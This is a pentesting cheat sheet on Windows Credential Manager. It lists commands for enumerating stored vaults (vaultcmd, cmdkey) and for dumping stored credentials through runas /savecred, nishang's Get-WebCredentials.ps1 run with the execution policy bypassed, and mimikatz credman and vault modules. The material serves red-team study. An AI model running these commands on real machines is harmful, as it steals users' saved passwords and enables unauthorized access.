# Credentials Manager

### Resources

1. **MITRE ATT\&CK**

{% embed url="https://attack.mitre.org/techniques/T1555/004/" %}

2. **Additional resources (The Hacker Recipes)**

{% embed url="https://www.thehacker.recipes/ad/movement/credentials/dumping/windows-credential-manager" %}

3. **Get-WebCredentials.ps1 (nishang)**

{% embed url="https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1" %}

4. **cmdkey**

{% embed url="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey" %}



### (1) Enumeration

#### 1.1 vaultcmd

**1.1.1** `/list`

By default, Windows has two vaults: **Web** and **Windows machine credentials**. The following command displays the two vaults:

```powershell
C:\> vaultcmd /list
```

**1.1.2** `/listproperties`

The following commands will list the properties of the web and windows machine credentials respectively:&#x20;

```powershell
C:\> vaultcmd /listproperties:"web credentials"
C:\> vaultcmd /listproperties:"windows credentials"
```

**1.1.3** `/listcreds`

List more information about the stored credentials (for web and windows machine respectively):

```powershell
C:\> vaultcmd /listcreds:"web credentials"
C:\> vaultcmd /listcreds:"windows credentials"
```

#### 1.2 cmdkey

```powershell
C:\> cmdkey /list
```

### (2) Retrieving/exploiting stored credentials

#### 2.1 runas.exe

We can use the `runas.exe` command to run commands (eg. `cmd.exe`) as a particular user with stored credentials.

```powershell
C:\> runas.exe /savecred /user:<username> <command_to_execute>

# eg. to spawn a command prompt for the username "USER" 
C:\> runas.exe /savecred /user:USER cmd.exe
```

* `/savecred`: Indicates if the credentials have been previously saved by this user
  * This option is required to tell `runas.exe` to pull the stored credentials

#### 2.2 GetWebCredentials.ps1

The `vaultcmd` and `cmdkey` commands does not provide methods to show the password. Thus, we have to realy on external PowerShell scripts such as [Get-WebCredentials.ps1](https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1):

> Ensure to run powershell with the bypass policy

<pre class="language-powershell"><code class="lang-powershell">C:\> powershell -ep bypass
PS C:\> Import-Module ./Get-WebCredentials.ps1
<strong>PS C:\> Get-WebCredentials
</strong>
UserName  Resource             Password     Properties
--------  --------             --------     ----------
...
</code></pre>

#### 2.3 mimikatz

1. `sekulrsa::credman`&#x20;

```powershell
mimikatz # privilege::debug
mimikatz # sekulrsa::credman 
```

2. `vault::list`, `vault::cred`&#x20;

```powershell
mimikatz # privilege::debug

mimikatz # vault::list 
mimikatz # vault::cred 
```

If error is encountered:

```powershell
mimikatz # token::elevate
```

### Overview of differences between `vaultcmd` and `cmdkey`

1. `vaultcmd /list`&#x20;

a. Displays both the **Web Credentials** and **Windows Credentials**

&#x20;2\. `cmdkey /list`&#x20;

a. Displays the credentials stored under **Windows Credentials** only

b. Displays the entries added via `cmdkey /add` or `runas.exe /savecred` commands

c. The output from the `vaultcmd /list` may overlap with the results from `vaultcmd /listcreds`

